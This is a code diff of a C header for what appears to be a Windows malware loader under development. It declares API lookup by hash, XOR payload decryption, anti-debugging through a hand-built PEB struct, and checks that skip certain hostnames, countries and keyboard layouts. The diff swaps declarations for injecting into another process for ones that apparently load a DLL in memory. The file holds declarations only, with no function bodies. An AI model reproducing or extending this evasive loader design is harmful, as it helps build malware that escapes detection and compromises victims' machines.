@@ -10,6 +10,9 @@
 
 // Define constants
 #define ASSOCATION_TABLE_SIZE 256
+#define CUR_PROC (HANDLE)-1
+
+typedef void (*DllEntryPoint)(HINSTANCE, DWORD, LPVOID);
 
 // Boolean type definition for compatibility
 typedef enum { false, true } bool;
@@ -30,19 +33,30 @@ typedef struct {
 // Declaration of an external association table
 extern const Association association_table[ASSOCATION_TABLE_SIZE];
 
+// Structure to represent a process environment block (PEB)
+typedef struct __PEB {
+    UCHAR InheritedAddressSpace;
+    UCHAR ReadImageFileExecOptions;
+    UCHAR BeingDebugged;
+    UCHAR BitField;
+    UCHAR Padding0[4];
+    PVOID Mutant;        // 0x08
+    PVOID ImageBaseAddr; // 0x10
+    PVOID LdrData;       // 0x18
+    PVOID ProcessParams; // 0x20
+} _PEB, *_PPEB;
+
+
+typedef void (*DllEntryPoint)(HINSTANCE, DWORD, LPVOID);
+
 // Function pointer typedefs for various Windows API functions
-typedef NTSTATUS (NTAPI* NtAllocVirtMem)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-typedef NTSTATUS (NTAPI* NtWriteVirtMem)(HANDLE, PVOID, PVOID, ULONG, PULONG);
-typedef NTSTATUS (NTAPI* NtProtectVirtMem)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-typedef NTSTATUS (NTAPI* NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PCRYPT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID);
-typedef NTSTATUS (NTAPI* NtWaitForSingleObj)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+typedef LPVOID (WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+typedef BOOL (WINAPI* VirtualProtectEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+typedef HMODULE (WINAPI* LoadLibraryA_t)(LPCSTR);
+typedef FARPROC (WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
 typedef BOOL (WINAPI* GetComputerNameFunc)(LPSTR, LPDWORD);
 typedef BOOL (WINAPI* GetDiskFreeSpaceExFuncA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
-typedef BOOL (WINAPI* Proc32First)(HANDLE, LPPROCESSENTRY32);
-typedef BOOL (WINAPI* Proc32Next)(HANDLE, LPPROCESSENTRY32);
-typedef HANDLE (WINAPI* CreateToolhelp32Snap)(DWORD, DWORD);
-typedef HANDLE (WINAPI* OpenProc)(DWORD, BOOL, DWORD);
-typedef BOOL (WINAPI* CloseHndle)(HANDLE);
 typedef void (WINAPI* GetSystemInfoFunc)(LPSYSTEM_INFO);
 typedef HKL (WINAPI* GetKeyboardLayoutFunc)(DWORD);
 typedef BOOL (WINAPI* GlobalMemoryStatusExFunc)(LPMEMORYSTATUSEX);
@@ -50,10 +64,8 @@ typedef uint16_t (WINAPI* GetSystemDefaultLangIDFunc)(void);
 typedef uint16_t (WINAPI* GetSystemDefaultLCIDFunc)(void);
 
 // External hash constants for various modules and functions
-extern const ObjHash NTDLL_HASH;
 extern const ObjHash USER32_HASH;
 extern const ObjHash KERNEL32_HASH;
-extern const ObjHash TARGET_PROCESS_NAME_HASH;
 extern const ObjHash QUERY_INFORMATION_PROCESS_HASH;
 extern const ObjHash GET_COMPUTER_NAME_HASH;
 extern const ObjHash GET_DISK_FREE_SPACE_HASH;
@@ -63,16 +75,11 @@ extern const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH;
 extern const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH;
 extern const ObjHash GET_KEYBOARD_LAYOUT_HASH;
 extern const ObjHash LOAD_LIBRARY_HASH;
-extern const ObjHash PROC32_FIRST_HASH;
-extern const ObjHash PROC32_NEXT_HASH;
-extern const ObjHash OPEN_PROCESS_HASH;
-extern const ObjHash CLOSE_HANDLE_HASH;
+extern const ObjHash GET_PROC_ADDRESS_HASH;
 extern const ObjHash CREATE_TOOLHELP32_SNAPSHOT_HASH;
 extern const ObjHash VIRTUAL_ALLOC_HASH;
 extern const ObjHash WRITE_MEMORY_HASH;
 extern const ObjHash VIRTUAL_PROTECT_HASH;
-extern const ObjHash CREATE_THREAD_HASH ;
-extern const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH;
 
 // External arrays and sizes for avoided hostnames and countries
 extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
@@ -90,7 +97,7 @@ void XOR(unsigned char *data, size_t len, uint16_t key);
 void DICT_decrypt(const char* dict_payload);
 HMODULE CustomGetModuleHandle(ObjHash module_hash);
 FARPROC CustomGetProcAddress(IN HMODULE hModule, ObjHash function_hash);
-DWORD _GetProcessID(HMODULE hKernel32, ObjHash procNameHash);
+PIMAGE_NT_HEADERS64 PE_getNtheaders(unsigned char* dll_data);
 
 // Validation and utility functions
 bool is_being_debugged();
@@ -141,5 +148,8 @@ static inline size_t custom_strlen(const char *str) {
     }
     return length;
 }
+
+
+
 
 #endif // DEFINITIONS_H
